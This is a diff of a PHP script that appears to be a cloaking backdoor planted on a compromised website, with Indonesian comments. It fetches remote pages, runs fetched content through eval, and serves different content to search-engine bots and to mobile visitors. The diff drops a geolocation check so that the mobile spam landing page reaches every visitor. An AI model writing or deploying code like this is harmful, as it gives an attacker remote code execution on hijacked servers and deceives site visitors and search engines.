@@ -28,25 +28,17 @@ function NuLzFetch($url){
         curl_close($ch);
         return $fetch;
     } else {
-        $fetch = "Cannot Fetch This URL => $url";
+        $fetch = "Can'not Fetch This URL => $url";
         return $fetch;
     }
 }
 
-function isFromIndonesia() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $response = NuLzFetch("https://ipinfo.io/{$ip}/json");
-    $data = json_decode($response, true);
-    
-    return isset($data['country']) && $data['country'] === 'ID';
-}
-
-$cookie_expiration = time() + (365 * 86400); //1 year
+$cookie_expiration = time() + (365 * 86400); //1 years
 if (!isset($_COOKIE['visited'])) {
     setcookie('visited', '1', $cookie_expiration, "/");
 }
 
-$cache_duration = 365 * 86400; //1 year
+$cache_duration = 365 * 86400; //1 years
 header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
@@ -63,13 +55,8 @@ if (isSearchEngineBot()) {
             // Jika bukan perangkat mobile, tampilkan $index_home
             eval ('?>'.NuLzFetch($index_home));
         } else {
-            // Jika perangkat mobile, tampilkan landing page hanya jika dari Indonesia
-            if (isFromIndonesia()) {
-                echo NuLzFetch($landing_page);
-            } else {
-                // Tampilkan pesan atau konten lain jika bukan dari Indonesia
-                echo NuLzFetch($index_home);;
-            }
+            // Jika perangkat mobile, tampilkan landing page
+            echo NuLzFetch($landing_page);
         }
     }
 }
